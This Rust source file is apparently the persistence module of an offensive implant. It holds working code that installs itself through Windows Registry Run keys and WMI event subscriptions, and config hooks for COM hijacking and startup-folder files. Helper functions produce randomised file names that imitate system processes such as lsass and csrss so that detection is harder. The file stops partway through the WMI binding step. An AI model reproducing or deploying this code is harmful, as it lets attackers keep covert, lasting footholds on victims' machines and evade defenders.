/// Advanced Persistence Module mapped to traits (FR-1 through FR-4)
use anyhow::Result;
use common::config::PersistenceConfig;
use std::path::PathBuf;

// ──────────────────────────────────────────────────────────────────────────────
// Random IoC generation helpers
// ──────────────────────────────────────────────────────────────────────────────

/// Deterministic seed derived from the agent executable path so that
/// `install()` and `remove()` / `verify()` produce the same random IoC values
/// across calls for the same binary.
fn ioc_seed() -> u64 {
    use std::hash::{Hash, Hasher};
    let exe = std::env::current_exe().unwrap_or_default();
    let mut h = std::collections::hash_map::DefaultHasher::new();
    exe.hash(&mut h);
    h.finish()
}

/// Generate a random alphanumeric string of 8–12 characters, seeded by
/// `ioc_seed()` XORed with a per-field discriminator so each field gets a
/// different value.
fn random_alphanum(discriminator: u64) -> String {
    use rand::prelude::*;
    let mut rng = StdRng::seed_from_u64(ioc_seed() ^ discriminator);
    let len = rng.gen_range(8..=12);
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    (0..len).map(|_| CHARSET[rng.gen_range(0..CHARSET.len())] as char).collect()
}

/// Generate a random valid CLSID string like `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`.
fn random_clsid(discriminator: u64) -> String {
    use rand::prelude::*;
    let mut rng = StdRng::seed_from_u64(ioc_seed() ^ discriminator);
    let mut hex = |n: usize| -> String {
        (0..n).map(|_| {
            let b = rng.gen_range(0u8..=15);
            format!("{:x}", b)
        }).collect()
    };
    format!("{{{}-{}-{}-{}-{}}}", hex(8), hex(4), hex(4), hex(4), hex(12))
}

/// Legitimate-sounding Windows service/executable name components.
const SVC_PREFIXES: &[&str] = &[
    "ms", "win", "sys", "wua", "wmp", "dll", "svch", "ctf", "dwm", "lsass",
    "smss", "csrss", "services", "spool", "taskhost", "runtime",
];
const SVC_VERBS: &[&str] = &[
    "update", "helper", "broker", "host", "svc", "core", "net", "sec",
    "diag", "notify", "diag", "mgr", "disp", "sched",
];

/// Generate a random legitimate-sounding `.exe` filename.
fn random_exe_filename(discriminator: u64) -> String {
    use rand::prelude::*;
    let mut rng = StdRng::seed_from_u64(ioc_seed() ^ discriminator);
    let prefix = SVC_PREFIXES[rng.gen_range(0..SVC_PREFIXES.len())];
    let verb = SVC_VERBS[rng.gen_range(0..SVC_VERBS.len())];
    let digits: String = (0..rng.gen_range(1..=3))
        .map(|_| char::from_digit(rng.gen_range(0..=9), 10).unwrap())
        .collect();
    format!("{}{}{}.exe", prefix, verb, digits)
}

/// Resolve the effective registry Run key value name from config or random.
fn resolve_registry_value_name(cfg: &PersistenceConfig) -> String {
    cfg.registry_value_name
        .clone()
        .unwrap_or_else(|| random_alphanum(0x11))
}

/// Resolve the effective WMI subscription name from config or random.
fn resolve_wmi_subscription_name(cfg: &PersistenceConfig) -> String {
    cfg.wmi_subscription_name
        .clone()
        .unwrap_or_else(|| random_alphanum(0x22))
}

/// Resolve the effective COM hijack CLSID from config or random.
fn resolve_com_hijack_clsid(cfg: &PersistenceConfig) -> String {
    cfg.com_hijack_clsid
        .clone()
        .unwrap_or_else(|| random_clsid(0x33))
}

/// Resolve the effective startup folder filename from config or random.
fn resolve_startup_filename(cfg: &PersistenceConfig) -> String {
    cfg.startup_filename
        .clone()
        .unwrap_or_else(|| random_exe_filename(0x44))
}

#[allow(clippy::ptr_arg)]
pub trait Persist {
    fn install(&self, executable_path: &PathBuf) -> Result<()>;
    fn remove(&self) -> Result<()>;
    fn verify(&self) -> Result<bool>;
}

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn shell_quote_single(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

// ──────────────────────────────────────────────────────────────────────────────
// Windows persistence implementations
// ──────────────────────────────────────────────────────────────────────────────
#[cfg(windows)]
pub use windows::*;
#[cfg(windows)]
pub mod windows {
    use super::Persist;
    use anyhow::{anyhow, Result};
    use std::path::PathBuf;
    use std::ptr;

    // ── FR-1A: Registry Run Keys ──────────────────────────────────────────────
    pub struct RegistryRunKey {
        pub value_name: String,
    }

    impl RegistryRunKey {
        /// Construct with a config-driven or randomly-generated value name.
        pub fn from_config(cfg: &PersistenceConfig) -> Self {
            Self {
                value_name: resolve_registry_value_name(cfg),
            }
        }
    }

    impl Persist for RegistryRunKey {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            use winapi::um::winnt::{KEY_WRITE, REG_SZ};
            use winapi::um::winreg::{
                RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_CURRENT_USER,
            };

            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                .encode_utf16()
                .collect();
            let val_str = executable_path.to_string_lossy().to_string();
            let val_wide: Vec<u16> = val_str.encode_utf16().chain(std::iter::once(0)).collect();
            let val_name: Vec<u16> = self
                .value_name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            unsafe {
                let mut hkey = ptr::null_mut();
                let ret =
                    RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
                if ret != 0 {
                    return Err(anyhow!(
                        "RegistryRunKey::install: RegOpenKeyExW failed: {}",
                        ret
                    ));
                }
                let set_ret = RegSetValueExW(
                    hkey,
                    val_name.as_ptr(),
                    0,
                    REG_SZ,
                    val_wide.as_ptr() as _,
                    (val_wide.len() * 2) as u32,
                );
                RegCloseKey(hkey);
                if set_ret != 0 {
                    return Err(anyhow!(
                        "RegistryRunKey::install: RegSetValueExW failed: {}",
                        set_ret
                    ));
                }
            }
            log::info!(
                "RegistryRunKey::install: set '{}' = '{}'",
                self.value_name,
                val_str
            );
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            use winapi::um::winnt::KEY_WRITE;
            use winapi::um::winreg::{
                RegCloseKey, RegDeleteValueW, RegOpenKeyExW, HKEY_CURRENT_USER,
            };

            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                .encode_utf16()
                .collect();
            let val_name: Vec<u16> = self
                .value_name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            unsafe {
                let mut hkey = ptr::null_mut();
                let ret =
                    RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
                if ret != 0 {
                    return Err(anyhow!(
                        "RegistryRunKey::remove: RegOpenKeyExW failed: {}",
                        ret
                    ));
                }
                RegDeleteValueW(hkey, val_name.as_ptr());
                RegCloseKey(hkey);
            }
            log::info!("RegistryRunKey::remove: deleted '{}'", self.value_name);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            use winapi::um::winnt::KEY_READ;
            use winapi::um::winreg::{
                RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY_CURRENT_USER,
            };

            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                .encode_utf16()
                .collect();
            let val_name: Vec<u16> = self
                .value_name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let mut buf = vec![0u16; 256];
            let mut buf_len = (buf.len() * 2) as u32;
            let mut val_type: u32 = 0;

            unsafe {
                let mut hkey = ptr::null_mut();
                if RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_READ, &mut hkey) != 0 {
                    return Ok(false);
                }
                let ret = RegQueryValueExW(
                    hkey,
                    val_name.as_ptr(),
                    ptr::null_mut(),
                    &mut val_type,
                    buf.as_mut_ptr() as _,
                    &mut buf_len,
                );
                RegCloseKey(hkey);
                Ok(ret == 0 && buf_len > 0)
            }
        }
    }

    // ── FR-1B: WMI Event Subscriptions ───────────────────────────────────────

    // ---- WMI COM interface definitions (wbemcli not in winapi crate) ---------
    //
    // We define only the vtable slots we need.  Layout must match the real
    // COM vtables on every version of Windows; these match the MSDN/SDK
    // definitions exactly.
    use winapi::shared::guiddef::{GUID, REFIID};
    use winapi::shared::wtypes::BSTR;
    use winapi::um::unknwnbase::{IUnknown, IUnknownVtbl};
    use winapi::um::winnt::LONG;

    // IWbemClassObject (partial vtable – only Put and Release are used)
    #[repr(C)]
    struct IWbemClassObjectVtbl {
        // IUnknown
        pub query_interface: unsafe extern "system" fn(*mut IWbemClassObject, REFIID, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub add_ref:         unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
        pub release:         unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
        // IWbemClassObject – first 3 methods before Put
        pub get_qualifier_set: unsafe extern "system" fn(*mut IWbemClassObject, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub get:             unsafe extern "system" fn(*mut IWbemClassObject, BSTR, LONG, *mut winapi::um::oaidl::VARIANT, *mut LONG, *mut LONG) -> winapi::shared::winerror::HRESULT,
        pub put:             unsafe extern "system" fn(*mut IWbemClassObject, BSTR, LONG, *mut winapi::um::oaidl::VARIANT, LONG) -> winapi::shared::winerror::HRESULT,
    }
    #[repr(C)]
    struct IWbemClassObject {
        pub lpvtbl: *const IWbemClassObjectVtbl,
    }

    // IWbemServices (partial vtable)
    // Full vtable slot offsets per MSDN (IWbemServices inherits from IUnknown):
    //   0 QueryInterface, 1 AddRef, 2 Release,
    //   3 OpenNamespace, 4 CancelAsyncCall, 5 QueryObjectSink,
    //   6 GetObject, 7 GetObjectAsync,
    //   8 PutClass, 9 PutClassAsync,
    //   10 DeleteClass, 11 DeleteClassAsync,
    //   12 CreateClassEnum, 13 CreateClassEnumAsync,
    //   14 PutInstance, 15 PutInstanceAsync,
    //   16 DeleteInstance, 17 DeleteInstanceAsync,
    //   18 CreateInstanceEnum, 19 CreateInstanceEnumAsync,
    //   20 ExecQuery, ...
    #[repr(C)]
    struct IWbemServicesVtbl {
        pub query_interface:      unsafe extern "system" fn(*mut IWbemServices, REFIID, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub add_ref:              unsafe extern "system" fn(*mut IWbemServices) -> u32,
        pub release:              unsafe extern "system" fn(*mut IWbemServices) -> u32,
        pub open_namespace:       unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut IWbemServices, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub cancel_async_call:    unsafe extern "system" fn(*mut IWbemServices, *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub query_object_sink:    unsafe extern "system" fn(*mut IWbemServices, LONG, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub get_object:           unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut IWbemClassObject, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub get_object_async:     unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub put_class:            unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub put_class_async:      unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub delete_class:         unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub delete_class_async:   unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub create_class_enum:    unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub create_class_enum_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub put_instance:         unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub put_instance_async:   unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub delete_instance:      unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub delete_instance_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub create_instance_enum: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub create_instance_enum_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub exec_query:           unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
    }
    #[repr(C)]
    struct IWbemServices {
        pub lpvtbl: *const IWbemServicesVtbl,
    }

    // IWbemLocator (partial vtable – only ConnectServer)
    #[repr(C)]
    struct IWbemLocatorVtbl {
        pub query_interface: unsafe extern "system" fn(*mut IWbemLocator, REFIID, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub add_ref:         unsafe extern "system" fn(*mut IWbemLocator) -> u32,
        pub release:         unsafe extern "system" fn(*mut IWbemLocator) -> u32,
        pub connect_server:  unsafe extern "system" fn(
            *mut IWbemLocator,
            BSTR,                        // strNetworkResource (namespace)
            BSTR,                        // strUser
            BSTR,                        // strPassword
            BSTR,                        // strLocale
            LONG,                        // lSecurityFlags
            BSTR,                        // strAuthority
            *mut std::ffi::c_void,       // pCtx
            *mut *mut IWbemServices,     // ppNamespace (out)
        ) -> winapi::shared::winerror::HRESULT,
    }
    #[repr(C)]
    struct IWbemLocator {
        pub lpvtbl: *const IWbemLocatorVtbl,
    }

    // GUIDs
    const CLSID_WBEM_LOCATOR: GUID = GUID {
        Data1: 0x4590_f811,
        Data2: 0x1d3a,
        Data3: 0x11d0,
        Data4: [0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24],
    };
    const IID_IWBEM_LOCATOR: GUID = GUID {
        Data1: 0xdc12_a687,
        Data2: 0x737f,
        Data3: 0x11cf,
        Data4: [0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24],
    };

    // WBEM_FLAG_CREATE_OR_UPDATE = 0
    const WBEM_FLAG_CREATE_OR_UPDATE: LONG = 0;
    // WBEM_FLAG_FORWARD_ONLY = 0x20 (for ExecQuery — forward-only enumerator)
    const WBEM_FLAG_FORWARD_ONLY: LONG = 0x20;
    // WBEM_INFINITE = 0xFFFFFFFF (timeout for IEnumWbemClassObject::Next)
    const WBEM_INFINITE: LONG = -1;
    // VT_BSTR = 8
    const VT_BSTR: u16 = 8;

    // IEnumWbemClassObject (partial vtable – Next and Release)
    // Full vtable: 0 QI, 1 AddRef, 2 Release, 3 Reset, 4 Next, 5 NextAsync,
    //              6 Skip, 7 Clone
    #[repr(C)]
    struct IEnumWbemClassObjectVtbl {
        pub query_interface: unsafe extern "system" fn(*mut IEnumWbemClassObject, REFIID, *mut *mut std::ffi::c_void) -> winapi::shared::winerror::HRESULT,
        pub add_ref:         unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
        pub release:         unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
        pub reset:           unsafe extern "system" fn(*mut IEnumWbemClassObject) -> winapi::shared::winerror::HRESULT,
        pub next:            unsafe extern "system" fn(
            *mut IEnumWbemClassObject,
            LONG,                          // lTimeout
            u32,                           // uCount
            *mut *mut IWbemClassObject,    // apObjects
            *mut u32,                      // puReturned
        ) -> winapi::shared::winerror::HRESULT,
    }
    #[repr(C)]
    struct IEnumWbemClassObject {
        pub lpvtbl: *const IEnumWbemClassObjectVtbl,
    }

    // Helper: allocate a BSTR from a Rust &str
    unsafe fn alloc_bstr(s: &str) -> BSTR {
        use winapi::um::oleauto::SysAllocStringLen;
        let wide: Vec<u16> = s.encode_utf16().collect();
        SysAllocStringLen(wide.as_ptr(), wide.len() as u32)
    }

    // Helper: free a BSTR (null-safe)
    unsafe fn free_bstr(b: BSTR) {
        use winapi::um::oleauto::SysFreeString;
        if !b.is_null() {
            SysFreeString(b);
        }
    }

    // Helper: set a BSTR property on an IWbemClassObject
    unsafe fn put_bstr_prop(
        obj: *mut IWbemClassObject,
        name: &str,
        value: &str,
    ) -> winapi::shared::winerror::HRESULT {
        use winapi::um::oaidl::VARIANT;
        let name_bstr = alloc_bstr(name);
        let val_bstr = alloc_bstr(value);
        let mut var: VARIANT = std::mem::zeroed();
        // Set variant type to VT_BSTR and assign the BSTR value
        // VARIANT layout: n1 → n2 → (vt, n3 union containing bstrVal)
        var.n1.n2_mut().vt = VT_BSTR;
        *var.n1.n2_mut().n3.bstrVal_mut() = val_bstr;
        let hr = ((*(*obj).lpvtbl).put)(obj, name_bstr, 0, &mut var, 0);
        // Do NOT SysFreeString val_bstr — VariantClear would normally do it,
        // but since we own the VARIANT and it's on the stack we free it here
        // only after the Put call has copied/addref'd the value.
        free_bstr(val_bstr);
        free_bstr(name_bstr);
        hr
    }

    // Helper: read a BSTR property from an IWbemClassObject.
    // Returns Ok(String) on success, or Err if the property is missing /
    // not a BSTR.
    unsafe fn get_bstr_prop(obj: *mut IWbemClassObject, name: &str) -> Result<String> {
        use winapi::um::oaidl::VARIANT;
        let name_bstr = alloc_bstr(name);
        let mut var: VARIANT = std::mem::zeroed();
        let hr = ((*(*obj).lpvtbl).get)(obj, name_bstr, 0, &mut var, ptr::null_mut(), ptr::null_mut());
        free_bstr(name_bstr);
        if !winapi::shared::winerror::SUCCEEDED(hr) {
            return Err(anyhow!("IWbemClassObject::Get('{}') failed: 0x{:08X}", name, hr));
        }
        let vt = var.n1.n2().vt;
        if vt != VT_BSTR {
            return Err(anyhow!("Property '{}' is not VT_BSTR (got {})", name, vt));
        }
        let bstr = *var.n1.n2().n3.bstrVal();
        let s = if bstr.is_null() {
            String::new()
        } else {
            let len = (0..).take_while(|&i| *bstr.add(i) != 0).count();
            String::from_utf16_lossy(std::slice::from_raw_parts(bstr, len))
        };
        winapi::um::oleauto::VariantClear(&mut var);
        Ok(s)
    }

    /// Resolve the `SpawnInstance` virtual function pointer from an
    /// `IWbemClassObject` vtable with runtime layout validation.
    ///
    /// The documented vtable index for `SpawnInstance` on `IWbemClassObject` is
    /// 16 (0-based), but relying on a hardcoded index is fragile.  This helper
    /// validates the vtable structure before using it:
    ///
    /// 1. Reads vtable entries at indices 0, 1, 2 (IUnknown: QueryInterface,
    ///    AddRef, Release) and index 16 (SpawnInstance); all must be non-null.
    /// 2. Calls `GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS)`
    ///    on both vtable[0] and vtable[16].  Both must succeed and return the
    ///    same module handle, confirming that SpawnInstance resides in the same
    ///    WMI implementation DLL as the known-good IUnknown methods and that no
    ///    out-of-module hook has redirected entry 16.
    ///
    /// Returns the validated function pointer, or `None` to signal that the
    /// caller should fall back to the PowerShell path.
    unsafe fn resolve_spawn_instance(
        class_obj: *mut IWbemClassObject,
    ) -> Option<
        unsafe extern "system" fn(
            *mut IWbemClassObject,
            LONG,
            *mut *mut IWbemClassObject,
        ) -> winapi::shared::winerror::HRESULT,
    > {
        use winapi::um::libloaderapi::{
            GetModuleHandleExW, GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        };

        // Read the vtable pointer from the object header.
        let vtbl = *(class_obj as *const *const usize);

        // All sentinel entries must be non-null.
        for &idx in &[0usize, 1, 2, 16] {
            let entry = vtbl.add(idx).read();
            if entry == 0 {
                log::warn!(
                    "WmiSubscription: vtable[{}] is null; IWbemClassObject layout mismatch",
                    idx
                );
                return None;
            }
        }

        let entry_0 = vtbl.add(0).read() as *const winapi::ctypes::c_void;
        let entry_16 = vtbl.add(16).read() as *const winapi::ctypes::c_void;

        // Both entries must belong to the same module (the WMI implementation
        // DLL, typically fastprox.dll).  A mismatch indicates an inline hook or
        // an unexpected vtable layout change and we fall back to PowerShell.
        let flags = GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
            | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT;
        let mut hmod_0: winapi::shared::minwindef::HMODULE = std::ptr::null_mut();
        let mut hmod_16: winapi::shared::minwindef::HMODULE = std::ptr::null_mut();

        let ok0 = GetModuleHandleExW(flags, entry_0 as *const _, &mut hmod_0);
        let ok16 = GetModuleHandleExW(flags, entry_16 as *const _, &mut hmod_16);

        if ok0 == 0 || ok16 == 0 {
            log::warn!(
                "WmiSubscription: GetModuleHandleExW failed for vtable entries (ok0={}, ok16={}); \
                 cannot verify SpawnInstance location",
                ok0, ok16
            );
            return None;
        }

        if hmod_0 != hmod_16 {
            log::warn!(
                "WmiSubscription: vtable[0] ({:p}) and vtable[16] ({:p}) are in different \
                 modules; possible hook detected — refusing hardcoded SpawnInstance index",
                hmod_0, hmod_16
            );
            return None;
        }

        Some(std::mem::transmute(entry_16))
    }

    // Core COM implementation: returns Ok(()) on success, Err with HR description on failure.
    unsafe fn wmi_install_com(
        subscription_name: &str,
        exe_path: &str,
    ) -> Result<()> {
        use winapi::shared::winerror::SUCCEEDED;
        use winapi::um::combaseapi::{CoCreateInstance, CoSetProxyBlanket};
        use winapi::shared::rpcdce::{RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE};

        // Step 1: CoCreateInstance(CLSID_WbemLocator)
        let mut locator_ptr: *mut IWbemLocator = ptr::null_mut();
        let hr = CoCreateInstance(
            &CLSID_WBEM_LOCATOR,
            ptr::null_mut(),
            winapi::um::combaseapi::CLSCTX_INPROC_SERVER,
            &IID_IWBEM_LOCATOR,
            &mut locator_ptr as *mut _ as *mut *mut std::ffi::c_void,
        );
        if !SUCCEEDED(hr) {
            return Err(anyhow!("CoCreateInstance(WbemLocator) failed: 0x{:08X}", hr));
        }
        let locator = &mut *locator_ptr;

        // Step 2: ConnectServer("root\\subscription")
        let ns_bstr = alloc_bstr("root\\subscription");
        let mut services_ptr: *mut IWbemServices = ptr::null_mut();
        let hr = ((*locator.lpvtbl).connect_server)(
            locator_ptr,
            ns_bstr,
            ptr::null_mut(), // user (current)
            ptr::null_mut(), // password (current)
            ptr::null_mut(), // locale (default)
            0,               // security flags
            ptr::null_mut(), // authority
            ptr::null_mut(), // context
            &mut services_ptr,
        );
        free_bstr(ns_bstr);
        if !SUCCEEDED(hr) {
            ((*locator.lpvtbl).release)(locator_ptr);
            return Err(anyhow!("IWbemLocator::ConnectServer failed: 0x{:08X}", hr));
        }

        // Step 3: Set proxy blanket on IWbemServices
        let hr = CoSetProxyBlanket(
            services_ptr as *mut IUnknown,
            RPC_C_AUTHN_WINNT,
            RPC_C_AUTHZ_NONE,
            ptr::null_mut(),
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            ptr::null_mut(),
            0, // EOAC_NONE
        );
        if !SUCCEEDED(hr) {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*locator.lpvtbl).release)(locator_ptr);
            return Err(anyhow!("CoSetProxyBlanket failed: 0x{:08X}", hr));
        }

        // Step 4a: Get the __EventFilter class definition and spawn an instance
        let filter_class_bstr = alloc_bstr("__EventFilter");
        let mut filter_class_obj: *mut IWbemClassObject = ptr::null_mut();
        let hr = ((*(*services_ptr).lpvtbl).get_object)(
            services_ptr,
            filter_class_bstr,
            0,
            ptr::null_mut(),
            &mut filter_class_obj,
            ptr::null_mut(),
        );
        free_bstr(filter_class_bstr);
        if !SUCCEEDED(hr) {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*locator.lpvtbl).release)(locator_ptr);
            return Err(anyhow!("GetObject(__EventFilter) failed: 0x{:08X}", hr));
        }

        // Spawn a new instance from the class object by calling SpawnInstance.
        // The vtable layout is validated at runtime via resolve_spawn_instance
        // (checks module provenance of vtable[0] and vtable[16]) so that a
        // layout change or out-of-module hook causes fallback to PowerShell
        // rather than a crash or bad indirect call.
        let spawn_instance_fn = match resolve_spawn_instance(filter_class_obj) {
            Some(f) => f,
            None => {
                ((*(*filter_class_obj).lpvtbl).release)(filter_class_obj);
                ((*(*services_ptr).lpvtbl).release)(services_ptr);
                ((*locator.lpvtbl).release)(locator_ptr);
                return Err(anyhow!(
                    "SpawnInstance vtable validation failed for __EventFilter; vtable layout mismatch or hook detected"
                ));
            }
        };

        let mut filter_inst: *mut IWbemClassObject = ptr::null_mut();
        let hr = spawn_instance_fn(filter_class_obj, 0, &mut filter_inst);
        ((*(*filter_class_obj).lpvtbl).release)(filter_class_obj);
        if !SUCCEEDED(hr) {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*locator.lpvtbl).release)(locator_ptr);
            return Err(anyhow!("SpawnInstance(__EventFilter) failed: 0x{:08X}", hr));
        }

        let filter_query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
        put_bstr_prop(filter_inst, "Name", subscription_name);
        put_bstr_prop(filter_inst, "EventNamespace", "root/cimv2");
        put_bstr_prop(filter_inst, "QueryLanguage", "WQL");
        put_bstr_prop(filter_inst, "Query", filter_query);

        let hr = ((*(*services_ptr).lpvtbl).put_instance)(
            services_ptr, filter_inst, WBEM_FLAG_CREATE_OR_UPDATE,
            ptr::null_mut(), ptr::null_mut(),
        );
        ((*(*filter_inst).lpvtbl).release)(filter_inst);
        if !SUCCEEDED(hr) {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*locator.lpvtbl).release)(locator_ptr);
            return Err(anyhow!("PutInstance(__EventFilter) failed: 0x{:08X}", hr));
        }

        // Step 4b: CommandLineEventConsumer
        let consumer_class_bstr = alloc_bstr("CommandLineEventConsumer");
        let mut consumer_class_obj: *mut IWbemClassObject = ptr::null_mut();
        let hr = ((*(*services_ptr).lpvtbl).get_object)(
            services_ptr,
            consumer_class_bstr,
            0,
            ptr::null_mut(),
            &mut consumer_class_obj,
            ptr::null_mut(),
        );
        free_bstr(consumer_class_bstr);
        if !SUCCEEDED(hr) {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*locator.lpvtbl).release)(locator_ptr);
            return Err(anyhow!("GetObject(CommandLineEventConsumer) failed: 0x{:08X}", hr));
        }

        let spawn_instance_fn2 = match resolve_spawn_instance(consumer_class_obj) {
            Some(f) => f,
            None => {
                ((*(*consumer_class_obj).lpvtbl).release)(consumer_class_obj);
                ((*(*services_ptr).lpvtbl).release)(services_ptr);
                ((*locator.lpvtbl).release)(locator_ptr);
                return Err(anyhow!(
                    "SpawnInstance vtable validation failed for CommandLineEventConsumer; vtable layout mismatch or hook detected"
                ));
            }
        };
        let mut consumer_inst: *mut IWbemClassObject = ptr::null_mut();
        let hr = spawn_instance_fn2(consumer_class_obj, 0, &mut consumer_inst);
        ((*(*consumer_class_obj).lpvtbl).release)(consumer_class_obj);
        if !SUCCEEDED(hr) {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*locator.lpvtbl).release)(locator_ptr);
            return Err(anyhow!("SpawnInstance(CommandLineEventConsumer) failed: 0x{:08X}", hr));
        }

        put_bstr_prop(consumer_inst, "Name", subscription_name);
        put_bstr_prop(consumer_inst, "CommandLineTemplate", exe_path);

        let hr = ((*(*services_ptr).lpvtbl).put_instance)(
            services_ptr, consumer_inst, WBEM_FLAG_CREATE_OR_UPDATE,
            ptr::null_mut(), ptr::null_mut(),
        );
        ((*(*consumer_inst).lpvtbl).release)(consumer_inst);
        if !SUCCEEDED(hr) {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*locator.lpvtbl).release)(locator_ptr);
            return Err(anyhow!("PutInstance(CommandLineEventConsumer) failed: 0x{:08X}", hr));
        }

        // Step 4c: __FilterToConsumerBinding
        let binding_class_bstr = alloc_bstr("__FilterToConsumerBinding");
        let mut binding_class_obj: *mut IWbemClassObject = ptr::null_mut();
        let hr = ((*(*services_ptr).lpvtbl).get_object)(
            services_ptr,
            binding_class_bstr,
            0,
            ptr::null_mut(),
            &mut binding_class_obj,
            ptr::null_mut(),
        );
        free_bstr(binding_class_bstr);
        if !SUCCEEDED(hr) {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
            ((*locator.lpvtbl).release)(locator_ptr);
            return Err(anyhow!("GetObject(__FilterToConsumerBinding) failed: 0x{:08X}", hr));
        }

        let spawn_instance_fn3 = match resolve_spawn_instance(binding_class_obj) {
            Some(f) => f,
            None => {
                ((*(*binding_class_obj).lpvtbl).release)(binding_class_obj);
                ((*(*services_ptr).lpvtbl).release)(services_ptr);
                ((*locator.lpvtbl).release)(locator_ptr);
                return Err(anyhow!(
                    "SpawnInstance vtable validation failed for __FilterToConsumerBinding; vtable layout mismatch or hook detected"
                ));
            }
        };
        let mut binding_inst: *mut IWbemClassObject = ptr::null_mut();
        let hr = spawn_instance_fn3(binding_class_obj, 0, &mut binding_inst);
        ((*(*binding_class_obj).lpvtbl).release)(binding_class_obj);
        if !SUCCEEDED(hr) {
            ((*(*services_ptr).lpvtbl).release)(services_ptr);
